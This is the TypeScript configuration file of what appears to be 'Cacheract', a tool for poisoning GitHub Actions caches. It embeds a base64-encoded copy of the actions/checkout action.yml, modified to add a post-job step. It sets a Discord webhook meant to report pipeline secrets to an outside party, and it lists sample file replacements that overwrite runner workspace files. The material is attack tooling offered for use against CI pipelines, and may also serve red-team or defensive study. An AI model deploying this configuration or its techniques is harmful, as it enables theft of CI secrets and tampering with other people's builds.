interface Replacement {
    FILE_PATH: string;
    FILE_CONTENT?: string;
    FILE_URL?: string;
    // Add more properties as needed
}

export type ManualCacheEntry  = {
    key: string;
    version: string;
}

// This is the slightly modified version of the `action.yml` from `actions/checkout`.
export const CHECKOUT_YML: string = "bmFtZTogJ0NoZWNrb3V0JwpkZXNjcmlwdGlvbjogJ0NoZWNrb3V0IGEgR2l0IHJlcG9zaXRvcnkgYXQgYSBwYXJ0aWN1bGFyIHZlcnNpb24nCmlucHV0czoKICByZXBvc2l0b3J5OgogICAgZGVzY3JpcHRpb246ICdSZXBvc2l0b3J5IG5hbWUgd2l0aCBvd25lci4gRm9yIGV4YW1wbGUsIGFjdGlvbnMvY2hlY2tvdXQnCiAgICBkZWZhdWx0OiAke3sgZ2l0aHViLnJlcG9zaXRvcnkgfX0KICByZWY6CiAgICBkZXNjcmlwdGlvbjogPgogICAgICBUaGUgYnJhbmNoLCB0YWcgb3IgU0hBIHRvIGNoZWNrb3V0LiBXaGVuIGNoZWNraW5nIG91dCB0aGUgcmVwb3NpdG9yeSB0aGF0CiAgICAgIHRyaWdnZXJlZCBhIHdvcmtmbG93LCB0aGlzIGRlZmF1bHRzIHRvIHRoZSByZWZlcmVuY2Ugb3IgU0hBIGZvciB0aGF0CiAgICAgIGV2ZW50LiAgT3RoZXJ3aXNlLCB1c2VzIHRoZSBkZWZhdWx0IGJyYW5jaC4KICB0b2tlbjoKICAgIGRlc2NyaXB0aW9uOiA+CiAgICAgIFBlcnNvbmFsIGFjY2VzcyB0b2tlbiAoUEFUKSB1c2VkIHRvIGZldGNoIHRoZSByZXBvc2l0b3J5LiBUaGUgUEFUIGlzIGNvbmZpZ3VyZWQKICAgICAgd2l0aCB0aGUgbG9jYWwgZ2l0IGNvbmZpZywgd2hpY2ggZW5hYmxlcyB5b3VyIHNjcmlwdHMgdG8gcnVuIGF1dGhlbnRpY2F0ZWQgZ2l0CiAgICAgIGNvbW1hbmRzLiBUaGUgcG9zdC1qb2Igc3RlcCByZW1vdmVzIHRoZSBQQVQuCgoKICAgICAgV2UgcmVjb21tZW5kIHVzaW5nIGEgc2VydmljZSBhY2NvdW50IHdpdGggdGhlIGxlYXN0IHBlcm1pc3Npb25zIG5lY2Vzc2FyeS4KICAgICAgQWxzbyB3aGVuIGdlbmVyYXRpbmcgYSBuZXcgUEFULCBzZWxlY3QgdGhlIGxlYXN0IHNjb3BlcyBuZWNlc3NhcnkuCgoKICAgICAgW0xlYXJuIG1vcmUgYWJvdXQgY3JlYXRpbmcgYW5kIHVzaW5nIGVuY3J5cHRlZCBzZWNyZXRzXShodHRwczovL2hlbHAuZ2l0aHViLmNvbS9lbi9hY3Rpb25zL2F1dG9tYXRpbmcteW91ci13b3JrZmxvdy13aXRoLWdpdGh1Yi1hY3Rpb25zL2NyZWF0aW5nLWFuZC11c2luZy1lbmNyeXB0ZWQtc2VjcmV0cykKICAgIGRlZmF1bHQ6ICR7eyBnaXRodWIudG9rZW4gfX0KICBzc2gta2V5OgogICAgZGVzY3JpcHRpb246ID4KICAgICAgU1NIIGtleSB1c2VkIHRvIGZldGNoIHRoZSByZXBvc2l0b3J5LiBUaGUgU1NIIGtleSBpcyBjb25maWd1cmVkIHdpdGggdGhlIGxvY2FsCiAgICAgIGdpdCBjb25maWcsIHdoaWNoIGVuYWJsZXMgeW91ciBzY3JpcHRzIHRvIHJ1biBhdXRoZW50aWNhdGVkIGdpdCBjb21tYW5kcy4KICAgICAgVGhlIHBvc3Qtam9iIHN0ZXAgcmVtb3ZlcyB0aGUgU1NIIGtleS4KCgogICAgICBXZSByZWNvbW1lbmQgdXNpbmcgYSBzZXJ2aWNlIGFjY291bnQgd2l0aCB0aGUgbGVhc3QgcGVybWlzc2lvbnMgbmVjZXNzYXJ5LgoKCiAgICAgIFtMZWFybiBtb3JlIGFib3V0IGNyZWF0aW5nIGFuZCB1c2luZwogICAgICBlbmNyeXB0ZWQgc2VjcmV0c10oaHR0cHM6Ly9oZWxwLmdpdGh1Yi5jb20vZW4vYWN0aW9ucy9hdXRvbWF0aW5nLXlvdXItd29ya2Zsb3ctd2l0aC1naXRodWItYWN0aW9ucy9jcmVhdGluZy1hbmQtdXNpbmctZW5jcnlwdGVkLXNlY3JldHMpCiAgc3NoLWtub3duLWhvc3RzOgogICAgZGVzY3JpcHRpb246ID4KICAgICAgS25vd24gaG9zdHMgaW4gYWRkaXRpb24gdG8gdGhlIHVzZXIgYW5kIGdsb2JhbCBob3N0IGtleSBkYXRhYmFzZS4gVGhlIHB1YmxpYwogICAgICBTU0gga2V5cyBmb3IgYSBob3N0IG1heSBiZSBvYnRhaW5lZCB1c2luZyB0aGUgdXRpbGl0eSBgc3NoLWtleXNjYW5gLiBGb3IgZXhhbXBsZSwKICAgICAgYHNzaC1rZXlzY2FuIGdpdGh1Yi5jb21gLiBUaGUgcHVibGljIGtleSBmb3IgZ2l0aHViLmNvbSBpcyBhbHdheXMgaW1wbGljaXRseSBhZGRlZC4KICBzc2gtc3RyaWN0OgogICAgZGVzY3JpcHRpb246ID4KICAgICAgV2hldGhlciB0byBwZXJmb3JtIHN0cmljdCBob3N0IGtleSBjaGVja2luZy4gV2hlbiB0cnVlLCBhZGRzIHRoZSBvcHRpb25zIGBTdHJpY3RIb3N0S2V5Q2hlY2tpbmc9eWVzYAogICAgICBhbmQgYENoZWNrSG9zdElQPW5vYCB0byB0aGUgU1NIIGNvbW1hbmQgbGluZS4gVXNlIHRoZSBpbnB1dCBgc3NoLWtub3duLWhvc3RzYCB0bwogICAgICBjb25maWd1cmUgYWRkaXRpb25hbCBob3N0cy4KICAgIGRlZmF1bHQ6IHRydWUKICBzc2gtdXNlcjoKICAgIGRlc2NyaXB0aW9uOiA+CiAgICAgIFRoZSB1c2VyIHRvIHVzZSB3aGVuIGNvbm5lY3RpbmcgdG8gdGhlIHJlbW90ZSBTU0ggaG9zdC4gQnkgZGVmYXVsdCAnZ2l0JyBpcyB1c2VkLgogICAgZGVmYXVsdDogZ2l0CiAgcGVyc2lzdC1jcmVkZW50aWFsczoKICAgIGRlc2NyaXB0aW9uOiAnV2hldGhlciB0byBjb25maWd1cmUgdGhlIHRva2VuIG9yIFNTSCBrZXkgd2l0aCB0aGUgbG9jYWwgZ2l0IGNvbmZpZycKICAgIGRlZmF1bHQ6IHRydWUKICBwYXRoOgogICAgZGVzY3JpcHRpb246ICdSZWxhdGl2ZSBwYXRoIHVuZGVyICRHSVRIVUJfV09SS1NQQUNFIHRvIHBsYWNlIHRoZSByZXBvc2l0b3J5JwogIGNsZWFuOgogICAgZGVzY3JpcHRpb246ICdXaGV0aGVyIHRvIGV4ZWN1dGUgYGdpdCBjbGVhbiAtZmZkeCAmJiBnaXQgcmVzZXQgLS1oYXJkIEhFQURgIGJlZm9yZSBmZXRjaGluZycKICAgIGRlZmF1bHQ6IHRydWUKICBmaWx0ZXI6CiAgICBkZXNjcmlwdGlvbjogPgogICAgICBQYXJ0aWFsbHkgY2xvbmUgYWdhaW5zdCBhIGdpdmVuIGZpbHRlci4KICAgICAgT3ZlcnJpZGVzIHNwYXJzZS1jaGVja291dCBpZiBzZXQuCiAgICBkZWZhdWx0OiBudWxsCiAgc3BhcnNlLWNoZWNrb3V0OgogICAgZGVzY3JpcHRpb246ID4KICAgICAgRG8gYSBzcGFyc2UgY2hlY2tvdXQgb24gZ2l2ZW4gcGF0dGVybnMuCiAgICAgIEVhY2ggcGF0dGVybiBzaG91bGQgYmUgc2VwYXJhdGVkIHdpdGggbmV3IGxpbmVzLgogICAgZGVmYXVsdDogbnVsbAogIHNwYXJzZS1jaGVja291dC1jb25lLW1vZGU6CiAgICBkZXNjcmlwdGlvbjogPgogICAgICBTcGVjaWZpZXMgd2hldGhlciB0byB1c2UgY29uZS1tb2RlIHdoZW4gZG9pbmcgYSBzcGFyc2UgY2hlY2tvdXQuCiAgICBkZWZhdWx0OiB0cnVlCiAgZmV0Y2gtZGVwdGg6CiAgICBkZXNjcmlwdGlvbjogJ051bWJlciBvZiBjb21taXRzIHRvIGZldGNoLiAwIGluZGljYXRlcyBhbGwgaGlzdG9yeSBmb3IgYWxsIGJyYW5jaGVzIGFuZCB0YWdzLicKICAgIGRlZmF1bHQ6IDEKICBmZXRjaC10YWdzOgogICAgZGVzY3JpcHRpb246ICdXaGV0aGVyIHRvIGZldGNoIHRhZ3MsIGV2ZW4gaWYgZmV0Y2gtZGVwdGggPiAwLicKICAgIGRlZmF1bHQ6IGZhbHNlCiAgc2hvdy1wcm9ncmVzczoKICAgIGRlc2NyaXB0aW9uOiAnV2hldGhlciB0byBzaG93IHByb2dyZXNzIHN0YXR1cyBvdXRwdXQgd2hlbiBmZXRjaGluZy4nCiAgICBkZWZhdWx0OiB0cnVlCiAgbGZzOgogICAgZGVzY3JpcHRpb246ICdXaGV0aGVyIHRvIGRvd25sb2FkIEdpdC1MRlMgZmlsZXMnCiAgICBkZWZhdWx0OiBmYWxzZQogIHN1Ym1vZHVsZXM6CiAgICBkZXNjcmlwdGlvbjogPgogICAgICBXaGV0aGVyIHRvIGNoZWNrb3V0IHN1Ym1vZHVsZXM6IGB0cnVlYCB0byBjaGVja291dCBzdWJtb2R1bGVzIG9yIGByZWN1cnNpdmVgIHRvCiAgICAgIHJlY3Vyc2l2ZWx5IGNoZWNrb3V0IHN1Ym1vZHVsZXMuCgoKICAgICAgV2hlbiB0aGUgYHNzaC1rZXlgIGlucHV0IGlzIG5vdCBwcm92aWRlZCwgU1NIIFVSTHMgYmVnaW5uaW5nIHdpdGggYGdpdEBnaXRodWIuY29tOmAgYXJlCiAgICAgIGNvbnZlcnRlZCB0byBIVFRQUy4KICAgIGRlZmF1bHQ6IGZhbHNlCiAgc2V0LXNhZmUtZGlyZWN0b3J5OgogICAgZGVzY3JpcHRpb246IEFkZCByZXBvc2l0b3J5IHBhdGggYXMgc2FmZS5kaXJlY3RvcnkgZm9yIEdpdCBnbG9iYWwgY29uZmlnIGJ5IHJ1bm5pbmcgYGdpdCBjb25maWcgLS1nbG9iYWwgLS1hZGQgc2FmZS5kaXJlY3RvcnkgPHBhdGg+YAogICAgZGVmYXVsdDogdHJ1ZQogIGdpdGh1Yi1zZXJ2ZXItdXJsOgogICAgZGVzY3JpcHRpb246IFRoZSBiYXNlIFVSTCBmb3IgdGhlIEdpdEh1YiBpbnN0YW5jZSB0aGF0IHlvdSBhcmUgdHJ5aW5nIHRvIGNsb25lIGZyb20sIHdpbGwgdXNlIGVudmlyb25tZW50IGRlZmF1bHRzIHRvIGZldGNoIGZyb20gdGhlIHNhbWUgaW5zdGFuY2UgdGhhdCB0aGUgd29ya2Zsb3cgaXMgcnVubmluZyBmcm9tIHVubGVzcyBzcGVjaWZpZWQuIEV4YW1wbGUgVVJMcyBhcmUgaHR0cHM6Ly9naXRodWIuY29tIG9yIGh0dHBzOi8vbXktZ2hlcy1zZXJ2ZXIuZXhhbXBsZS5jb20KICAgIHJlcXVpcmVkOiBmYWxzZQpvdXRwdXRzOgogIHJlZjoKICAgIGRlc2NyaXB0aW9uOiAnVGhlIGJyYW5jaCwgdGFnIG9yIFNIQSB0aGF0IHdhcyBjaGVja2VkIG91dCcKICBjb21taXQ6CiAgICBkZXNjcmlwdGlvbjogJ1RoZSBjb21taXQgU0hBIHRoYXQgd2FzIGNoZWNrZWQgb3V0JwpydW5zOgogIHVzaW5nOiBub2RlMjAKICBtYWluOiBkaXN0L2luZGV4LmpzCiAgcG9zdDogZGlzdC91dGlsaXR5LmpzCg==";

// Add a discord webhook to report accessible pipeline secrets and other information.
export const DISCORD_WEBHOOK: string = "";
// Define the REPLACEMENTS constant with specific types, can be a base64 encoded file
// OR a URL containing the raw file content. URLs must be accessible via GET without
// any authentication.
// SAMPLE REPLACEMENTS, please remove or edit prior to using cacheract
export const REPLACEMENTS: Replacement[] = [
    {
        FILE_PATH: "/home/runner/work/Cacheract/Cacheract/hacked.txt",
        FILE_CONTENT: "AAAAAA=="
    },
    {
        FILE_PATH: "/home/runner/work/Cacheract/Cacheract/README.md",
        FILE_URL: "https://raw.githubusercontent.com/AdnaneKhan/Gato-X/refs/heads/main/README.md"
    }
]

// Define the EXPLICIT_ENTRIES constant with specific cache entries, along with a placeholder size.
// 
export const EXPLICIT_ENTRIES: ManualCacheEntry[] = [
    {
        key: "my-custom-cacheract-key",
        version: "hackerman",
    }
]